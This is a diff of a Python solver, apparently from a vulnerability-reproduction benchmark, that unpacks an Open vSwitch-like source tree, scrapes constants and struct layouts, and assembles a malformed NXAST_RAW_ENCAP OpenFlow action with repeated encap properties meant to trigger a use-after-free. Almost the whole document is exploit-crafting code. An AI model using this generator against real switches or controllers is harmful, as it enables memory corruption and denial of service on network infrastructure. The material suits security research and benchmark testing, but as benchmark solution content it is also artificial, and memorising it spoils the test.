-        if "ofpacts_decode" in t or "ofpacts_pull_openflow_actions" in t:
-            mode = "actions"
-            if re.search(r"\bdata\s*\+\s*1\b", t) and ("version" in tl or "ofp_version" in tl):
-                version_prefix = True
-            return mode, version_prefix
-
-    # Otherwise decide if it's message-based.
-    for p in fuzzer_files:
-        t = _read_file_text(p) or ""
-        if "ofpmsg_decode" in t or "ofpraw_pull" in t or "ofp_print" in t:
-            mode = "message"
-            return mode, False
-
-    # Fallback: if any uses data+1 with version, assume prefix.
-    for p in fuzzer_files:
-        t = _read_file_text(p) or ""
-        tl = t.lower()
-        if re.search(r"\bdata\s*\+\s*1\b", t) and ("version" in tl or "ofp_version" in tl):
-            version_prefix = True
-            break
-
-    return mode, version_prefix
+def _find_stub_size(root: str) -> int:
+    candidates = _find_files_containing(root, "LLVMFuzzerTestOneInput", limit=20)
+    stub_sizes = []
+    for p in candidates:
+        try:
+            with open(p, "r", encoding="utf-8", errors="ignore") as f:
+                t = f.read()
+        except Exception:
+            continue
+        for m in re.finditer(r"\bOFPBUF_STUB_INITIALIZER\s*\(\s*[^,]+,\s*(\d+)\s*\)", t):
+            stub_sizes.append(int(m.group(1)))
+        for m in re.finditer(r"\bofpbuf_init\s*\(\s*&\w+\s*,\s*(\d+)\s*\)", t):
+            stub_sizes.append(int(m.group(1)))
+    if stub_sizes:
+        return max(64, min(stub_sizes))
+    return 64
 
 
-def _pack_be(val: int, size: int) -> bytes:
-    if size == 1:
-        return struct.pack("!B", val & 0xFF)
-    if size == 2:
-        return struct.pack("!H", val & 0xFFFF)
-    if size == 4:
-        return struct.pack("!I", val & 0xFFFFFFFF)
-    if size == 8:
-        return struct.pack("!Q", val & 0xFFFFFFFFFFFFFFFF)
-    return bytes([0] * size)
-
-
-def _build_ofp10_packet_out(actions: bytes) -> bytes:
-    version = 0x01
-    msg_type = 0x0D  # OFPT_PACKET_OUT
-    length = 16 + len(actions)
-    xid = 0
-    header = struct.pack("!BBHI", version, msg_type, length & 0xFFFF, xid)
-    buffer_id = 0
-    in_port = 0
-    actions_len = len(actions)
-    body = struct.pack("!IHH", buffer_id, in_port, actions_len & 0xFFFF)
-    return header + body + actions
+def _pack_ed_prop(prop_type: int, prop_len: int, header_size: int, type_off: int, len_off: int) -> bytes:
+    b = bytearray(prop_len)
+    if header_size <= prop_len and type_off + 2 <= prop_len and len_off + 2 <= prop_len:
+        struct.pack_into("!H", b, type_off, prop_type & 0xFFFF)
+        struct.pack_into("!H", b, len_off, prop_len & 0xFFFF)
+    else:
+        struct.pack_into("!H", b, 0, prop_type & 0xFFFF)
+        struct.pack_into("!H", b, 2, prop_len & 0xFFFF)
+    return bytes(b)
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        tmpdir = tempfile.mkdtemp(prefix="arvo_uaf_")
+        tmp = tempfile.mkdtemp(prefix="poc_uaf_")
         try:
-            _safe_extract_tar(src_path, tmpdir)
-            root = tmpdir
+            _safe_extract_tar(src_path, tmp)
+            root = _pick_project_root(tmp)
 
-            mode, version_prefix = _detect_input_mode(root)
+            consts: Dict[str, int] = {}
+            define_exprs: Dict[str, str] = {}
 
-            # Locate file with decode_NXAST_RAW_ENCAP to help select prop type.
-            ofp_actions_cands = _find_files_containing(root, b"decode_NXAST_RAW_ENCAP")
-            ofp_actions_text = ""
-            if ofp_actions_cands:
-                ofp_actions_text = _read_file_text(ofp_actions_cands[0]) or ""
+            seed_files = set()
+            for needle in ("NXAST_RAW_ENCAP", "RAW_ENCAP", "decode_ed_prop", "decode_NXAST_RAW_ENCAP", "NX_EXPERIMENTER_ID", "NX_VENDOR_ID", "NX_VENDOR"):
+                for p in _find_files_containing(root, needle, limit=30):
+                    seed_files.add(p)
 
-            # Collect relevant files for constants and structs.
-            relevant_files = set()
-            for needle in (b"NXAST_RAW_ENCAP", b"NX_VENDOR_ID", b"RAW_ENCAP", b"ed_prop", b"ED_PROP", b"NXPEDPT"):
-                for p in _find_files_containing(root, needle):
-                    relevant_files.add(p)
-            if ofp_actions_cands:
-                relevant_files.add(ofp_actions_cands[0])
+            if not seed_files:
+                seed_files = set(_iter_source_files(root)[:200])
 
-            # Fallback: include a few common headers if present.
-            for p in _find_files_containing(root, b"nx-match.h"):
-                relevant_files.add(p)
-            for p in _find_files_containing(root, b"openflow.h"):
-                relevant_files.add(p)
-
-            resolver = _ConstResolver()
-            struct_blocks_all: Dict[str, str] = {}
-            for p in list(relevant_files)[:250]:
-                txt = _read_file_text(p)
-                if not txt:
+            for p in seed_files:
+                try:
+                    with open(p, "r", encoding="utf-8", errors="ignore") as f:
+                        t = f.read()
+                except Exception:
                     continue
-                _parse_defines(txt, resolver)
-                _parse_enums(txt, resolver)
-                sb = _extract_struct_blocks(txt)
-                if sb:
-                    struct_blocks_all.update(sb)
+                _parse_defines_and_enums_from_text(t, define_exprs, consts)
 
-            resolver.resolve_all()
+            _resolve_define_exprs(define_exprs, consts)
 
-            nx_vendor_id = resolver.get("NX_VENDOR_ID")
-            if nx_vendor_id is None:
-                nx_vendor_id = 0x00002320
-
-            nxast_raw_encap = resolver.get("NXAST_RAW_ENCAP")
-            if nxast_raw_encap is None:
-                # Try alternative naming
-                nxast_raw_encap = resolver.get("NXAST_RAW_ENCAP".lower())
-            if nxast_raw_encap is None:
-                # Commonly in enum; fallback to a plausible non-zero
-                nxast_raw_encap = 0
-
-            # Pick action struct and parse layout.
-            raw_encap_struct = _choose_raw_encap_struct(struct_blocks_all)
-            action_struct_size = 16
-            action_layout: List[Tuple[str, int, int]] = []
-            if raw_encap_struct and raw_encap_struct in struct_blocks_all:
-                body = struct_blocks_all[raw_encap_struct]
-                sz, layout = _parse_struct_layout_from_body(body, resolver)
-                if sz >= 12:
-                    action_struct_size = sz
-                    action_layout = layout
-
-            # Pick ed_prop header struct and parse layout.
-            ed_prop_hdr_struct = _choose_ed_prop_header_struct(struct_blocks_all)
-            prop_hdr_size = 4
-            prop_hdr_layout: List[Tuple[str, int, int]] = []
-            if ed_prop_hdr_struct and ed_prop_hdr_struct in struct_blocks_all:
-                body = struct_blocks_all[ed_prop_hdr_struct]
-                sz, layout = _parse_struct_layout_from_body(body, resolver)
-                if sz >= 4 and sz <= 32:
-                    prop_hdr_size = sz
-                    prop_hdr_layout = layout
-
-            # Choose a property type constant name from decode_ed_prop switch cases.
-            prop_type_name: Optional[str] = None
-            prop_type_val: Optional[int] = None
-
-            decode_ed_prop_body = _find_function_body(ofp_actions_text, "decode_ed_prop") if ofp_actions_text else None
-            if decode_ed_prop_body:
-                cases = list(re.finditer(r"\bcase\s+([A-Za-z_]\w*)\s*:", decode_ed_prop_body))
-                if cases:
-                    # Create block slices
-                    candidates: List[Tuple[int, str]] = []
-                    for idx, cm in enumerate(cases):
-                        name = cm.group(1)
-                        start = cm.end()
-                        end = cases[idx + 1].start() if idx + 1 < len(cases) else len(decode_ed_prop_body)
-                        block = decode_ed_prop_body[start:end]
-                        score = 0
-                        uname = name.upper()
-                        if "RAW" in uname:
-                            score += 100
-                        if "HEADER" in uname:
-                            score += 50
-                        if "DATA" in uname or "BYTES" in uname:
-                            score += 25
-                        if re.search(r"\blen\s*-\s*", block):
-                            score += 20
-                        if "ofpbuf_put" in block or "ofpbuf_put_uninit" in block:
-                            score += 10
-                        if re.search(r"!=\s*sizeof\s*\(|==\s*sizeof\s*\(", block):
-                            score -= 60
-                        if re.search(r"\blen\s*!=\s*", block):
-                            score -= 20
-                        if "OFPERR" in block:
-                            score -= 5
-                        candidates.append((score, name))
-                    candidates.sort(reverse=True)
-                    for _, nm in candidates[:10]:
-                        v = resolver.get(nm)
+            if "NXAST_RAW_ENCAP" not in consts:
+                patt = re.compile(r"(?:#\s*define\s+NXAST_RAW_ENCAP\s+|NXAST_RAW_ENCAP\s*=\s*)([^,\n}]+)")
+                for p in _find_files_containing(root, "NXAST_RAW_ENCAP", limit=50):
+                    try:
+                        with open(p, "r", encoding="utf-8", errors="ignore") as f:
+                            t = f.read()
+                    except Exception:
+                        continue
+                    m = patt.search(_strip_c_comments(t))
+                    if m:
+                        v = _try_eval_int(m.group(1), consts)
                         if v is not None:
-                            prop_type_name = nm
-                            prop_type_val = v
+                            consts["NXAST_RAW_ENCAP"] = int(v)
                             break
 
-            # If still unknown, pick from known constants by heuristic.
-            if prop_type_val is None:
-                # Gather prop-type-like names we know values for.
-                keys = list(resolver.values.keys())
-                key_cands = []
-                for k in keys:
-                    uk = k.upper()
-                    if "ED" in uk and "PROP" in uk and ("TYPE" not in uk):
-                        sc = 0
-                        if "RAW" in uk:
-                            sc += 100
-                        if "HEADER" in uk:
-                            sc += 50
-                        if "DATA" in uk or "BYTES" in uk:
-                            sc += 25
-                        if uk.startswith("NXPEDPT_") or uk.startswith("NX_ED_PROP_") or uk.startswith("OFPPROP_"):
-                            sc += 10
-                        key_cands.append((sc, k))
-                key_cands.sort(reverse=True)
-                if key_cands:
-                    prop_type_name = key_cands[0][1]
-                    prop_type_val = resolver.values.get(prop_type_name)
+            vendor = consts.get("NX_EXPERIMENTER_ID")
+            if not isinstance(vendor, int):
+                vendor = consts.get("NX_VENDOR_ID")
+            if not isinstance(vendor, int):
+                vendor = consts.get("NX_VENDOR")
+            if not isinstance(vendor, int):
+                vendor = 0x00002320
 
-            if prop_type_val is None:
-                prop_type_val = 0
+            subtype = consts.get("NXAST_RAW_ENCAP")
+            if not isinstance(subtype, int):
+                subtype = 0
+            subtype &= 0xFFFF
 
-            # Build action: single NXAST_RAW_ENCAP with one ed_prop consuming the rest.
-            target_action_len = 72
-            # Ensure we have room for at least a minimal property.
-            min_payload = 16
-            target_action_len = max(target_action_len, _align8(action_struct_size + _align8(prop_hdr_size + min_payload)))
-            target_action_len = _align8(target_action_len)
+            prop_type, prop_len = _choose_ed_prop_type_and_len(root, consts)
 
-            # Property length is remaining bytes (single prop).
-            prop_len = target_action_len - action_struct_size
-            if prop_len < prop_hdr_size + 8:
-                target_action_len = _align8(action_struct_size + prop_hdr_size + 8)
-                prop_len = target_action_len - action_struct_size
-            prop_payload_len = prop_len - prop_hdr_size
-            if prop_payload_len < 0:
-                prop_payload_len = 0
+            stub_size = _find_stub_size(root)
+            target_total = max(256, min(16384, stub_size * 8))
 
-            action = bytearray(b"\x00" * target_action_len)
+            cache: Dict[str, Any] = {}
 
-            # Fill action fields by layout if available; else assume standard offsets.
-            def set_field_by_name(layout: List[Tuple[str, int, int]], field_names: Tuple[str, ...], value: int) -> bool:
-                for (nm, off, sz) in layout:
-                    if nm in field_names:
-                        action[off:off + sz] = _pack_be(value, sz)
-                        return True
-                return False
+            decode_info = _extract_action_struct_name_from_decode(root)
+            struct_name = "nx_action_raw_encap"
+            decode_file = None
+            if decode_info:
+                decode_file, struct_name = decode_info
 
-            if action_layout:
-                # common field names
-                set_field_by_name(action_layout, ("type",), 0xFFFF)
-                set_field_by_name(action_layout, ("len",), target_action_len)
-                set_field_by_name(action_layout, ("vendor", "experimenter"), nx_vendor_id)
-                set_field_by_name(action_layout, ("subtype",), nxast_raw_encap)
+            base_size = _compute_struct_size(root, struct_name, consts, cache)
+            if base_size is None:
+                base_size = 24
 
-                # If struct has any additional "*len" fields used by decoder, set them to props length.
-                # Heuristic: fields with "len" in name excluding "len" itself.
-                for (nm, off, sz) in action_layout:
-                    lnm = nm.lower()
-                    if "len" in lnm and nm not in ("len",):
-                        if lnm in ("encap_len", "props_len", "header_len", "data_len"):
-                            action[off:off + sz] = _pack_be(prop_len, sz)
+            vendor_off = _find_field_offset_recursive(root, struct_name, consts, cache, ("vendor", "experimenter", "nx_vendor", "exp_id"))
+            subtype_off = _find_field_offset_recursive(root, struct_name, consts, cache, ("subtype", "subtype_"))
+            encap_len_off = _find_field_offset_recursive(root, struct_name, consts, cache, ("encap_len", "raw_encap_len", "header_len", "hdr_len"))
+            props_len_off = _find_field_offset_recursive(root, struct_name, consts, cache, ("props_len", "properties_len", "prop_len", "tlv_len"))
+
+            type_off = 0
+            len_off = 2
+
+            ed_header_size = 4
+            ed_type_off = 0
+            ed_len_off = 2
+
+            ed_file, ed_struct, _, _ = _extract_decode_ed_prop_info(root, consts)
+            if ed_struct:
+                ed_size = _compute_struct_size(root, ed_struct, consts, cache)
+                if isinstance(ed_size, int) and 2 <= ed_size <= 16:
+                    ed_header_size = int(ed_size)
+                    ed_type_off2 = _find_field_offset_recursive(root, ed_struct, consts, cache, ("type",))
+                    ed_len_off2 = _find_field_offset_recursive(root, ed_struct, consts, cache, ("len", "length"))
+                    if ed_type_off2 is not None:
+                        ed_type_off = int(ed_type_off2)
+                    if ed_len_off2 is not None:
+                        ed_len_off = int(ed_len_off2)
+
+            if prop_len < ed_header_size:
+                prop_len = ((ed_header_size + 7) // 8) * 8
+
+            if base_size % 8 != 0:
+                base_size += (8 - (base_size % 8))
+
+            if prop_len % 8 != 0:
+                prop_len += (8 - (prop_len % 8))
+
+            if target_total < base_size + prop_len:
+                target_total = base_size + prop_len
+
+            nprops = (target_total - base_size + prop_len - 1) // prop_len
+            if nprops < 1:
+                nprops = 1
+            total_len = base_size + nprops * prop_len
+            if total_len % 8 != 0:
+                total_len += (8 - (total_len % 8))
+
+            header = bytearray(base_size)
+            struct.pack_into("!H", header, type_off, 0xFFFF)
+            struct.pack_into("!H", header, len_off, total_len & 0xFFFF)
+            if vendor_off is not None and vendor_off + 4 <= len(header):
+                struct.pack_into("!I", header, int(vendor_off), vendor & 0xFFFFFFFF)
             else:
-                # Standard NX experimenter action header layout.
-                action[0:2] = struct.pack("!H", 0xFFFF)
-                action[2:4] = struct.pack("!H", target_action_len)
-                action[4:8] = struct.pack("!I", nx_vendor_id & 0xFFFFFFFF)
-                action[8:10] = struct.pack("!H", nxast_raw_encap & 0xFFFF)
-                # rest zero
-                action_struct_size = 16
-                if action_struct_size > target_action_len:
-                    action_struct_size = min(target_action_len, 16)
-                prop_len = target_action_len - action_struct_size
-                prop_payload_len = prop_len - prop_hdr_size
-                if prop_payload_len < 0:
-                    prop_payload_len = 0
-
-            prop_off = action_struct_size
-
-            # Fill property header by layout if available; else assume (type,len) 16-bit each.
-            if prop_hdr_layout:
-                # property header is within action; pack into action.
-                # try set fields named "type" and "len"/"length"
-                set = False
-                for (nm, off, sz) in prop_hdr_layout:
-                    if nm == "type":
-                        action[prop_off + off:prop_off + off + sz] = _pack_be(prop_type_val, sz)
-                        set = True
-                if not set:
-                    # fallback first member
-                    if prop_hdr_layout:
-                        nm, off, sz = prop_hdr_layout[0]
-                        action[prop_off + off:prop_off + off + sz] = _pack_be(prop_type_val, sz)
-
-                set_len = False
-                for (nm, off, sz) in prop_hdr_layout:
-                    if nm in ("len", "length"):
-                        action[prop_off + off:prop_off + off + sz] = _pack_be(prop_len, sz)
-                        set_len = True
-                if not set_len and len(prop_hdr_layout) >= 2:
-                    nm, off, sz = prop_hdr_layout[1]
-                    action[prop_off + off:prop_off + off + sz] = _pack_be(prop_len, sz)
+                if 4 + 4 <= len(header):
+                    struct.pack_into("!I", header, 4, vendor & 0xFFFFFFFF)
+            if subtype_off is not None and subtype_off + 2 <= len(header):
+                struct.pack_into("!H", header, int(subtype_off), subtype & 0xFFFF)
             else:
-                # assume 16-bit type and 16-bit len
-                if prop_hdr_size < 4:
-                    prop_hdr_size = 4
-                action[prop_off:prop_off + 2] = struct.pack("!H", prop_type_val & 0xFFFF)
-                action[prop_off + 2:prop_off + 4] = struct.pack("!H", prop_len & 0xFFFF)
+                if 8 + 2 <= len(header):
+                    struct.pack_into("!H", header, 8, subtype & 0xFFFF)
 
-            # Fill payload with a non-zero pattern to avoid special-case paths.
-            payload_off = prop_off + prop_hdr_size
-            if payload_off < len(action):
-                for i in range(prop_payload_len):
-                    action[payload_off + i] = (0x41 + (i % 23)) & 0xFF
+            if encap_len_off is not None and encap_len_off + 2 <= len(header):
+                struct.pack_into("!H", header, int(encap_len_off), 0)
 
-            actions_bytes = bytes(action)
+            props_bytes_len = total_len - base_size
+            if props_len_off is not None:
+                off = int(props_len_off)
+                if off + 2 <= len(header):
+                    struct.pack_into("!H", header, off, props_bytes_len & 0xFFFF)
+                elif off + 4 <= len(header):
+                    struct.pack_into("!I", header, off, props_bytes_len & 0xFFFFFFFF)
 
-            if mode == "message":
-                return _build_ofp10_packet_out(actions_bytes)
+            props = bytearray()
+            one = _pack_ed_prop(prop_type, prop_len, ed_header_size, ed_type_off, ed_len_off)
+            props.extend(one * nprops)
+            if len(props) < props_bytes_len:
+                props.extend(b"\x00" * (props_bytes_len - len(props)))
+            elif len(props) > props_bytes_len:
+                props = props[:props_bytes_len]
 
-            if version_prefix:
-                # Use a common OpenFlow wire version byte; 0x04 (OpenFlow 1.3).
-                return bytes([0x04]) + actions_bytes
-
-            return actions_bytes
+            return bytes(header + props)
         finally:
-            shutil.rmtree(tmpdir, ignore_errors=True)
+            shutil.rmtree(tmp, ignore_errors=True)
